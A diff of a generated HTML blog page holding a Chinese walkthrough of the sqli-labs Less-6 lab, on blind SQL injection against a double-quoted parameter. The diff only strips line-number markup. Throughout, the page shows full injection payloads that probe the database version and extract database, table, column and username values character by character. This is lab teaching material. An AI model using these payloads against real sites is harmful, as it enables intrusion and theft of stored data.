@@ -29,8 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 
 
@@ -559,22 +558,22 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/单引号测试.png" alt="单引号测试"></center>
 </li>
 <li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=&quot;参数&quot; limit 0，1;</code>，<font color="red">参数为<code>String</code>型且使用单引号(<code>&quot;</code>)作为定界符</font>。因此，我们可以构造的恒真语句为：</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">" or "</span><span class="token number">1</span><span class="token string">"="</span><span class="token number">1</span>
-<span class="token number">1</span>" <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">" or "</span><span class="token number">1</span><span class="token string">"="</span><span class="token number">1</span>
+<span class="token number">1</span>" <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
 <p>其中<code>1&quot; or &quot;1&quot;=&quot;1</code>payload的操作结果如下图所示。</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/payload操作结果.png" alt="payload操作结果"></center>
 </li>
 <li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 1--+</span>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 1--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 2--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 3--+</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 4--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 4--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/order by 3测试结果.png" alt="order by 3测试结果"></center>
 
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/order by 4操作结果.png" alt="order by 4操作结果"></center>
 </li>
 <li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=-1" union select 1,2,3--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=-1" union select 1,2,3--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/union select判断回显.png" alt="union select判断回显"></center>
 
 <p>注：</p>
@@ -583,15 +582,15 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/inde
 </ul>
 </li>
 <li><p>查看数据库版本。对于无法回显回显时可以根据响应的页面不同来获取信息。对于获取MySQL数据库的版本信息也是如此，可以使用payload如下所示，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(version(),1)>=5--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(version(),1)>=5--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/获取数据库版本信息.png" alt="获取数据库版本信息"></center>
 </li>
 <li><p>爆数据库名称的长度。由上述操作得知MySQL的版本为<code>5.0</code>或高于<code>5.0</code>版本，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆当前数据库名称的长度，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>1--+</span>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>1--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>10--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>5--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>8--+</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>7--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>7--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/判断数据库长度是否大于8.png" alt="判断数据库长度是否大于8"></center>
 
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/判断数据库长度是否大于7.png" alt="判断数据库长度是否大于7"></center>
@@ -599,27 +598,27 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/inde
 <p>由上述操作得知当前数据库命长长度为：<code>8</code>。</p>
 </li>
 <li><p>爆数据库名称。在得到数据库名称长度后，可以还需要爆数据库的名称。使用如下所示的payload可以爆出当前数据库名称的首字母，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'a'--+</span>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'a'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'z'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'m'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'s'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'p'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'q'--+</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'r'--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'r'--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/数据库名称首字母是否大于s.png" alt="数据库名称首字母是否大于s"></center>
 
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/数据库名称首字母是否大于r.png" alt="数据库名称首字母是否大于r"></center>
 
 <p>由上述操作得知当前数据库首字母为：<code>s</code>。</p>
 <p>接着还需要爆数据库名称中其他位置的字符，数据库名称为<code>security</code>如下所示payload可逐个测试。</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)='s'--+</span>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)='s'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),2)='se'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),3)='sec'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),4)='secu'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),5)='secur'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),6)='securi'--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),7)='securit'--+</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),8)='security'--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),8)='security'--+</span></code></pre>
 <p>注：</p>
 <ul>
 <li><font color="blue">在正常测试中还是需要使用二分法，逐个逐位测试。</font></li>
@@ -627,18 +626,18 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/inde
 </li>
 <li><p>爆数据表名称。在得到数据库名称后，还需要继续爆数据库中的数据表名称，在爆破表名称长度之前通常会先爆破数据表名称的长度。</p>
 <p>爆<code>security</code>数据库中第一个数据表名称的长度。使用如下payload，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>1--+</span>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>1--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>10--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>5--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>8--+</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>6--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>6--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/数据库表名称是否大于5.png" alt="数据库表名称是否大于5"></center>
 
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/数据表名称是否大于6.png" alt="数据表名称是否大于6"></center>
 
 <p>由上述操作得知第一张数据表名称的长度为：<code>6</code>位。</p>
 <p>逐位爆第一张数据表名称。使用如下所示payload，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 是否大于a</span>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 是否大于a</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97--+</span>
 <span class="token comment" spellcheck="true">-- 是否大于z</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>122--+</span>
@@ -649,13 +648,13 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/inde
 <span class="token comment" spellcheck="true">-- 是否大于d</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100--+</span>
 <span class="token comment" spellcheck="true">-- 是否大于e</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>101--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>101--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/第一张表名的首字母是否大于d.png" alt="第一张表名的首字母是否大于d"></center>
 
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/第一张表明的首字母是否大于ue.png" alt="第一张表明的首字母是否大于e"></center>
 
 <p>由上述操作可以第一张表的首字母为：<code>e</code>。还需要继续爆破数据表名称中其他字符，第一张表名为：<code>emails</code>，使用如下payload可对数据表名进行测试。</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 第二位：m</span>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 第二位：m</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+</span>
 <span class="token comment" spellcheck="true">-- 第三位：a</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=97--+</span>
@@ -664,9 +663,9 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/inde
 <span class="token comment" spellcheck="true">-- 第五位：l</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=108--+</span>
 <span class="token comment" spellcheck="true">-- 第六位：s</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1))=115--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1))=115--+</span></code></pre>
 <p>在对第一张表名爆破成功后，还需要对后续的数据表名进行爆破，使用如下所示的payload可以对后面的表进行爆破：</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">---------------------- 第二张表：referers -----------------------------</span>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">---------------------- 第二张表：referers -----------------------------</span>
 <span class="token comment" spellcheck="true">-- 第二张表第一位：</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+</span>
 <span class="token comment" spellcheck="true">-- 第二张表第二位：</span>
@@ -698,43 +697,43 @@ http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/inde
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 <span class="token comment" spellcheck="true">-- 第四张表第五位：</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),5,1))=115--+</span>
-<span class="token comment" spellcheck="true">------------------------------------------------------------------------</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment" spellcheck="true">------------------------------------------------------------------------</span></code></pre>
 <p>由上述操作得知，<code>security</code>数据库中存在的数据表有：<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>。</p>
 <p>注：</p>
 <ul>
 <li><p>如何判断数据表名称列举完？如下payload可以完成测试</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 4,1),1,1))>0--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 4,1),1,1))>0--+</span></code></pre>
 </li>
 </ul>
 </li>
 <li><p>爆数据表列名。在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中第一个列名的长度，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>1--+</span>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>1--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>3--+</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>2--+</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/第一个列名长度.png" alt="第一个列名长度"></center>
 
 <p>利用<code>regexp</code>获取<code>user</code>表中的列。使用如下的payload，快速猜测数据表中是否存在与模式相匹配的列名，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 是否存在以us开头的列名</span>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 是否存在以us开头的列名</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+</span>
 <span class="token comment" spellcheck="true">-- 是否存在username开头的列名</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+</span>
 <span class="token comment" spellcheck="true">-- 是否存在password开头的列名</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 0,1)--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 0,1)--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/是否存在以username开头的列名、.png" alt="是否存在以username开头的列名"></center>
 
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/是否存在以password开头的列名.png" alt="是否存在以password开头的列名"></center>
 </li>
 <li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出<code>users</code>表中第一条数据的<code>username</code>值，操作结果如下图所示。</p>
-<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 第一位：D</span>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 第一位：D</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+</span>
 <span class="token comment" spellcheck="true">-- 第二位：u</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),2,1))=117--+</span>
 <span class="token comment" spellcheck="true">-- 第三位：m</span>
 http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),3,1))=109--+</span>
 <span class="token comment" spellcheck="true">-- 第四位：b</span>
-http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),4,1))=98--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),4,1))=98--+</span></code></pre>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/判断字段值第一位是否为D.png" alt="判断字段值第一位是否为D"></center>
 
 
